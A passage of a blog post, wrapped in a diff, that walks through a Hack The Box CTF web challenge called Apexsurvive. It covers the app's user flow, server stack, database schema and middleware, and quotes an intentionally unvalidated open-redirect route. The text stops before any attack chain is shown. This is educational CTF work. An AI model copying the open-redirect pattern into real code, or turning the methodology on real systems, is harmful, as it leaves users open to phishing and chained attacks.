@@ -1,0 +1,1434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Apexsurvive Writeup (HTB Cyber Apocalypse 2024) :: elmosalamy | blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Update: This writeup won 1st place in Hack The Box Writeup Competition Update 2: I mentioned a research paper that helped me solve this challenge by James Kettle." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/" />
+
+
+
+
+<link rel="stylesheet" href="//localhost:1313/assets/style.css">
+
+  <link rel="stylesheet" href="//localhost:1313/assets/green.css">
+
+
+
+<link rel="stylesheet" href="//localhost:1313/style.css">
+
+
+<link rel="apple-touch-icon" href="//localhost:1313/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="//localhost:1313/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Apexsurvive Writeup (HTB Cyber Apocalypse 2024)">
+<meta property="og:description" content="In this post I will walk you through my solution of **Apexsurvive** from Hack The Box 2024 Cyber Apocalypse CTF, a beautiful challenge that costed me three days of research, experimentation and sweat to take down. This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research." />
+<meta property="og:url" content="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/" />
+<meta property="og:site_name" content="elmosalamy | blog" />
+
+  <meta property="og:image" content="//localhost:1313/">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2024-03-17 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+   <script id="mathjax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [['$$', '$$']],  
+      inlineMath: [['$', '$']]      
+    }
+  };
+</script>
+
+ 
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    elmosalamy
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a target="" href="/posts">📝 Posts</a></li>
+        
+      
+        
+          <li><a target="" href="/tags">🏷️ Tags</a></li>
+        
+      
+        
+          <li><a target="_blank" href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/posts">📝 Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">🏷️ Tags</a></li>
+      
+    
+      
+        <li><a href="https://aelmosalamy.github.io">🔗 Random stuff</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/">Apexsurvive Writeup (HTB Cyber Apocalypse 2024)</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2024-03-17 
+      </span>
+    
+    
+    <span class="post-author">:: aelmosalamy</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="//localhost:1313/tags/ctf/">ctf</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+    <div class="table-of-contents">
+      <h2>
+        
+          Table of Contents
+        
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#chapter-0-introduction">Chapter 0: Introduction</a></li>
+    <li><a href="#chapter-1-a-very-normal-user">Chapter 1: A Very Normal User</a></li>
+    <li><a href="#chapter-2-navigating-the-tech-stack">Chapter 2: Navigating the Tech Stack</a>
+      <ul>
+        <li><a href="#directory-structure">Directory Structure</a></li>
+        <li><a href="#dockerfile">Dockerfile</a></li>
+        <li><a href="#supervisord">supervisord</a></li>
+        <li><a href="#nginx">nginx</a></li>
+        <li><a href="#uwsgi">uwsgi</a></li>
+      </ul>
+    </li>
+    <li><a href="#chapter-3-digging-into-flask">Chapter 3: Digging into Flask</a>
+      <ul>
+        <li><a href="#route-structure">Route Structure</a></li>
+        <li><a href="#middleware">Middleware</a></li>
+        <li><a href="#evaluating-our-privileges">Evaluating Our Privileges</a></li>
+      </ul>
+    </li>
+    <li><a href="#chapter-4-attempts-down-the-road">Chapter 4: Attempts down the Road</a>
+      <ul>
+        <li><a href="#session-hijacking">Session Hijacking</a></li>
+        <li><a href="#service-worker-hijacking-via-dom-clobbering">Service Worker Hijacking via DOM Clobbering</a></li>
+        <li><a href="#stored-xss-in-productnote">Stored XSS in <code>product.note</code></a></li>
+        <li><a href="#cross-side-request-forgery">Cross Side Request Forgery</a></li>
+        <li><a href="#honorable-mentions">Honorable Mentions</a></li>
+      </ul>
+    </li>
+    <li><a href="#chapter-5-internal-clarity">Chapter 5: Internal Clarity</a>
+      <ul>
+        <li><a href="#parseaddr-and-rfc2822">parseaddr and RFC2822</a></li>
+        <li><a href="#a-race-condition">A Race Condition?</a></li>
+        <li><a href="#winning-the-race">Winning the Race</a></li>
+      </ul>
+    </li>
+    <li><a href="#chapter-6-the-attack-chain">Chapter 6: The Attack Chain</a></li>
+    <li><a href="#chapter-7-conclusion">Chapter 7: Conclusion</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <blockquote>
+<p><strong>Update:</strong> This writeup won 1st place in Hack The Box Writeup Competition
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/discord_prize_announcement.png"></p>
+<p><strong>Update 2:</strong> I mentioned a research paper that helped me solve this challenge by James Kettle. The legend himself saw the writeup and commented on my post 😊:
+<img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/linkedin_james_kettle.png"></p>
+</blockquote>
+<p>Buckle up, this will be a fun read 😉</p>
+<h2 id="chapter-0-introduction">Chapter 0: Introduction<a href="#chapter-0-introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Hey there👋. I am <strong>Adham Elmosalamy</strong>, a Computer Engineering student, and in this post I will walk you through my solution of <strong>Apexsurvive</strong> from Hack The Box 2024 Cyber Apocalypse CTF, a beautiful challenge that costed me three days of research, experimentation and sweat to take down.</p>
+<p>This is a beginner-friendly writeup where I explain how web challenges like this could be approached: going over methodology, mindset and research.</p>
+<p><em>If you just want the solution, here is <a href="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/#chapter-6-the-attack-chain">the final attack chain.</a></em></p>
+<table>
+<thead>
+<tr>
+<th>Title</th>
+<th>Author</th>
+<th>Difficulty</th>
+<th>Solves</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apexsurvive</td>
+<td>Xclow3n</td>
+<td>Insane</td>
+<td>~30</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>In a dystopian future, a group of Maze Runners faces a deadly labyrinth. To navigate it, they need vital intel on maze shifts and hidden passages. Your mission: hack into ApexSurvive, the black-market hub for survival gear, to obtain the key information. The Maze Runners&rsquo; freedom depends on your skills. Time to infiltrate and hack the maze&rsquo;s lifeline. Good luck, hacker.</p>
+</blockquote>
+<p>We are given a running instance of the challenge + the source code, making this a white-box test.</p>
+<h2 id="chapter-1-a-very-normal-user">Chapter 1: A Very Normal User<a href="#chapter-1-a-very-normal-user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Let&rsquo;s explore the site&rsquo;s functionality starting with the homepage.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/guideline.png"></p>
+<p>We are given a bunch of guidelines and we are told that there are three routes in this app:</p>
+<ul>
+<li><code>/challenge/</code></li>
+<li><code>/challenge/api/</code></li>
+<li><code>/email/</code> (Out of scope)</li>
+</ul>
+<p>Navigating to <strong>Email App</strong> we are taken to <code>/email/</code>, an empty inbox, probably for our assigned email address <code>test@email.htb</code> as per the guidelines.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-empty.png"></p>
+<p>Cool. Let&rsquo;s go back and check <strong>Challenge</strong> which takes us to <code>/challenge/</code> and presents us with a simple login screen.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/login-empty.png"></p>
+<p>We register an account using <code>test@email.htb</code> and login.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/user-registered.png"></p>
+<p>Once logged in, we are taken to <code>/challenge/settings</code>, a form where we can modify our account settings.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/account-settings.png"></p>
+<p>Hovering over the navigation, there seems to be one valid link: <strong>Home</strong> (<code>/challenge/home</code>). We also notice an interesting <strong>Report Item</strong> feature.</p>
+<p>Both features return <code>Please verify your email first!</code>, so we do just that. We click <strong>Verify Email</strong>, check our inbox and follow the instructions to verify our account.</p>
+<ol>
+<li>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/verification-sent.png"></p>
+</li>
+<li>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/inbox-verification.png"></p>
+</li>
+<li>
+<p>We receive <code>Email verified!</code></p>
+</li>
+</ol>
+<p>Now we can access <code>/challenge/home</code> which shows us a list of items, seemingly for sale.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/home.png"></p>
+<p>And we can report an item. The confirmation messages alludes to a potential XSS vulnerability, let&rsquo;s keep that in mind.</p>
+<p><img src="/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/report-item.png"></p>
+<p>Excellent! We have completed the very first step of any web pentest: forming a conception of the purpose of the app, its features and user flow.</p>
+<h2 id="chapter-2-navigating-the-tech-stack">Chapter 2: Navigating the Tech Stack<a href="#chapter-2-navigating-the-tech-stack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>After scoping user flow and functionality, it is time to dig into the internals of the application.</p>
+<p>We won&rsquo;t jump into application logic straight away, instead we will try to form a high-level understanding of the technologies used and how everything is glued together. Understanding the role of different components in our app, their relationship and how they talk to each other is critical when analyzing any system.</p>
+<p>It is part of having a good methodology: get a high-level overview first, then view your options, eliminate unlikely ones, and expand on promising ones, keep repeating&hellip; eventually you will get somewhere.</p>
+<h3 id="directory-structure">Directory Structure<a href="#directory-structure" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Applying the above, let&rsquo;s start with exploring the directory structure of our app:</p>
+<pre tabindex="0"><code>.
+│   build-docker.sh
+│   Dockerfile
+│   entrypoint.sh
+│   flag.txt
+├───bot+
+├───challenge
+│   │   requirements.txt
+│   │   uwsgi.ini
+│   │   wsgi.py
+│   └───application
+│       │   config.py
+│       │   database.py
+│       │   main.py
+│       │   util.py
+│       ├───blueprints
+│       │       api.py
+│       │       info.py
+│       │       routes.py
+│       ├───middleware
+│       │       middlewares.py
+│       ├───static+
+│       └───templates+
+├───config
+│       nginx.conf
+│       readflag.c
+│       supervisord.conf
+└───email-app+
+</code></pre><p>Upon inspection, there are so many files, so many routes and so many things going on compared to your typical web challenge.</p>
+<p>This might be overwhelming, and many people would just decide to not continue at this point, but that should not deter us. In fact, a complex application indicates a bigger attack surface → higher chance of finding a vulnerability.</p>
+<p>Plus, we have a methodology, right? If we stick to our methodology, we will be able to systematically comb the application, find vulnerabilities, and build an attack chain.</p>
+<h3 id="dockerfile">Dockerfile<a href="#dockerfile" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Let&rsquo;s start with the <code>Dockerfile</code>. It gives us a high-level overview of the application and how it is set up. In fact, with experience, you can somewhat predict entire attack chains by just looking at the <code>Dockerfile</code>.</p>
+<p>Let&rsquo;s highlight our primary takeaways:</p>
+<ul>
+<li>Alpine Linux 3.14.1
+<ul>
+<li>Why that particular version? It is not the latest.</li>
+</ul>
+</li>
+<li>Email app running at <code>/email</code>
+<ul>
+<li>It&rsquo;s written in Node.</li>
+<li>MailHog 1.0.1 (Latest)</li>
+</ul>
+</li>
+<li>App uses a self-signed SSL certificate</li>
+<li>Python3</li>
+<li>MariaDB</li>
+<li>There is a <code>bot</code> user, Chromium and Selenium installed
+<ul>
+<li>We saw there was a report functionality from the previous step</li>
+<li>These all translate to one word: XSS</li>
+</ul>
+</li>
+<li><code>nginx</code> as a reverse proxy</li>
+<li><code>uwsgi</code>
+<ul>
+<li>What is that?</li>
+</ul>
+</li>
+<li><code>supervisord</code></li>
+<li>Flag at <code>/root/flag</code>, only available to <code>root</code>
+<ul>
+<li>Tells us that the bot cannot access the flag directly.</li>
+</ul>
+</li>
+</ul>
+<p>Let&rsquo;s look at <code>entrypoint.sh</code>, a script used to initialize the container after all dependencies and packages are brought in.</p>
+<p>The script configures the database, creating two tables: <code>users</code> and <code>products</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> apexsurvive.<span style="color:#a6e22e">users</span> (
+</span></span><span style="display:flex;"><span>    id <span style="color:#66d9ef">INTEGER</span> <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> <span style="color:#66d9ef">AUTO_INCREMENT</span>,
+</span></span><span style="display:flex;"><span>    email <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    password <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
+</span></span><span style="display:flex;"><span>    unconfirmedEmail <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    confirmToken <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    fullName <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">DEFAULT</span> <span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>    username <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">DEFAULT</span> <span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>    isConfirmed <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">DEFAULT</span> <span style="color:#e6db74">&#39;unverified&#39;</span>,
+</span></span><span style="display:flex;"><span>    isInternal <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">DEFAULT</span> <span style="color:#e6db74">&#39;false&#39;</span>,
+</span></span><span style="display:flex;"><span>    isAdmin <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">DEFAULT</span> <span style="color:#e6db74">&#39;false&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> apexsurvive.<span style="color:#a6e22e">products</span> (
+</span></span><span style="display:flex;"><span>    id <span style="color:#66d9ef">INTEGER</span> <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> <span style="color:#66d9ef">AUTO_INCREMENT</span>,
+</span></span><span style="display:flex;"><span>    name <span style="color:#66d9ef">VARCHAR</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    price <span style="color:#66d9ef">VARCHAR</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    image <span style="color:#66d9ef">VARCHAR</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    description <span style="color:#66d9ef">VARCHAR</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    seller <span style="color:#66d9ef">VARCHAR</span>(<span style="color:#ae81ff">255</span>),
+</span></span><span style="display:flex;"><span>    note <span style="color:#66d9ef">TEXT</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> apexsurvive.users <span style="color:#66d9ef">VALUES</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;xclow3n@apexsurvive.htb&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;$(genPass)&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Rajat Raghav&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;xclow3n&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;verified&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;true&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;true&#39;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>We notice three role columns in the <code>user</code> table:</p>
+<ul>
+<li><code>isConfirmed</code></li>
+<li><code>isInternal</code></li>
+<li><code>isAdmin</code></li>
+</ul>
+<p>Additionally, an admin account is inserted into <code>users</code> with all three roles assigned and is seeded with a strong random password defined by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> genPass<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    cat /dev/urandom | tr -dc <span style="color:#e6db74">&#39;[:alnum:]&#39;</span> | head -c <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Before terminating, the script launches <code>supervisord</code> using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/bin/supervisord -c /etc/supervisord.conf
+</span></span></code></pre></div><h3 id="supervisord">supervisord<a href="#supervisord" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><code>supervisord</code> is a process control system, it facilitates orchestration of the different applications in our container, kick starting all the different components with the right parameters. It also provides centralized monitoring and logging functionality.</p>
+<p>Looking at <code>supervisord.conf</code> we see 5 defined programs:</p>
+<pre tabindex="0"><code>[program:uwsgi]
+...
+
+[program:nginx]
+...
+
+[program:mailhog]
+...
+
+[program:node]
+...
+
+[program:botServer]
+...
+</code></pre><p>Out of these 5, only the first two concern us, <code>uwsgi</code> and <code>nginx</code> - as the rest pertain to the email server and the bot which are out-of-scope for now.</p>
+<h3 id="nginx">nginx<a href="#nginx" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><code>nginx</code> is a popular reverse proxy. Let&rsquo;s have a look at <code>nginx.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#66d9ef">server</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">listen</span> <span style="color:#ae81ff">1337</span> <span style="color:#e6db74">ssl</span> <span style="color:#e6db74">http2</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">listen</span> <span style="color:#e6db74">[::]:1337</span> <span style="color:#e6db74">ssl</span> <span style="color:#e6db74">http2</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">location</span> <span style="color:#e6db74">/</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_pass</span> <span style="color:#e6db74">http://127.0.0.1:5000</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_read_timeout</span> <span style="color:#e6db74">24h</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_http_version</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">location</span> <span style="color:#e6db74">^~</span> <span style="color:#e6db74">/email/</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_pass</span> <span style="color:#e6db74">http://127.0.0.1:8080</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_read_timeout</span> <span style="color:#e6db74">24h</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">proxy_http_version</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">.1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
+</span></span></code></pre></div><p>In this setup, <code>nginx</code> itself is using <code>HTTP/2</code>, while using <code>HTTP/1.1</code> internally to communicate with the underlying, proxied applications. Different protocols behave differently and noting this information could be the determinant of successful exploitation down the road.</p>
+<h3 id="uwsgi">uwsgi<a href="#uwsgi" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><code>uwsgi</code> is a versatile, powerful web server gateway interface (WSGI), and in our context it is used to run our Flask application.</p>
+<p>In this setup, <code>uwsgi</code> is sitting between <code>nginx</code> and our Flask application. <code>uwsgi</code> is launched by <code>supervisord</code> using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>command<span style="color:#f92672">=</span>/usr/sbin/uwsgi /app/uwsgi.ini --plugin python3
+</span></span></code></pre></div><p>Reviewing <code>uwsgi.ini</code>:</p>
+<pre tabindex="0"><code>[uwsgi]
+module = wsgi:app
+uid = root
+gid = root
+socket = 0.0.0.0:5000
+protocol = http
+chown-socket = www:www
+chmod-socket = 666
+master = True
+buffer-size=1000000
+vacuum = True
+die-on-term = True
+need-app = True
+py-autoreload = 3
+chdir = /app/
+processes = 4
+</code></pre><p>We can see that <code>uwsgi</code> is set to use <code>python3</code>, is running from <code>/app/</code> and is listening at <code>0.0.0.0:5000</code> which is the same port <code>nginx</code> mounts to <code>/</code>.</p>
+<p>Let&rsquo;s jump into <code>/app/</code>, the directory served by <code>uwsgi</code>, and explore what is actually going on under the hood.</p>
+<h2 id="chapter-3-digging-into-flask">Chapter 3: Digging into Flask<a href="#chapter-3-digging-into-flask" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>With our newfound understanding of user flow and system components, lets dig into the actual app logic. We will try to look for hidden features and perhaps find ways to disrupt the user flow explored in the previous step.</p>
+<p>This process requires patience, we need to carefully scan the codebase, noting how each part of the code could serve us as attackers. We might need to draw diagrams, take notes or even speak our thought process out loud.</p>
+<h3 id="route-structure">Route Structure<a href="#route-structure" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Let&rsquo;s jump right in.</p>
+<p><code>application/main.py</code> is our Flask application&rsquo;s entry point.</p>
+<p>We notice that Service Workers are enabled on the entire challenge path:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.after_request</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_security_headers</span>(resp):
+</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Service-Worker-Allowed&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/challenge/&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><p>Interesting.</p>
+<p>A couple of blueprints are mounted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>app<span style="color:#f92672">.</span>register_blueprint(web, url_prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/challenge&#39;</span>)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>register_blueprint(api, url_prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/challenge/api&#39;</span>)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>register_blueprint(challengeInfo, url_prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span></code></pre></div><p>Flask blueprints are analogous to routers in the Node/Express world. They are a way to modularize your app components.</p>
+<p><code>blueprints/api.py</code> defines API routes, mostly to interact with the underlying database via POST requests.</p>
+<p><code>blueprints/routes.py</code> defines user routes, mostly serving web pages through GET requests.</p>
+<p>We instantly spot an exposed <strong>Open Redirect</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@web.route</span>(<span style="color:#e6db74">&#39;/external&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">external</span>():
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;url&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url)
+</span></span></code></pre></div><p>An Open Redirect on its own is not exploitable; however, coupled with other vulnerabilities it can lead to very cool attacks.</p>
+<h3 id="middleware">Middleware<a href="#middleware" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In both files, middleware are used extensively for authentication, authorization as well as other security protections such as input sanitization and Cross Site Request Forgery (CSRF) protections.</p>
+<p>When a certain security control is used extensively throughout an app, it makes sense to spend some good time understanding how it is implemented as these controls could be vulnerable.</p>
+<p>Here is a list of all middleware in the application and their function:</p>
+<ul>
+<li>
+<p><code>@isAuthenticated</code>
+Grabs the <code>session</code> cookie, verifies the JWT within and passes the decoded token forward. Pretty standard.</p>
+</li>
+<li>
+<p><code>@isVerified</code>
+Checks whether the authenticated user is verified, using a simple <code>user['isConfirmed'] == 'unverified'</code></p>
+</li>
+<li>
+<p><code>@isInternal</code>
+Checks whether the authenticated user has the <code>isInternal</code> role, using a simple <code>user['isInternal'] != 'true'</code></p>
+</li>
+<li>
+<p><code>@isAdmin</code>
+Checks whether the authenticated user has the <code>isAdmin</code> role, using a simple <code>user['isAdmin'] != 'true'</code></p>
+</li>
+<li>
+<p><code>@antiCSRF</code>
+Protects against CSRF by ensuring every requests has an <code>antiCSRFToken</code>. More on how the app implements this later.</p>
+</li>
+<li>
+<p><code>@sanitizeInput</code>
+This important control uses <code>bleach</code>, a popular, whitelist-based sanitization library to sanitize all query params and body data against Cross-Site Scripting (XSS):</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sanitizeInput</span>(f):
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@wraps</span>(f)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decorator</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>        sanitized_args <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>items():
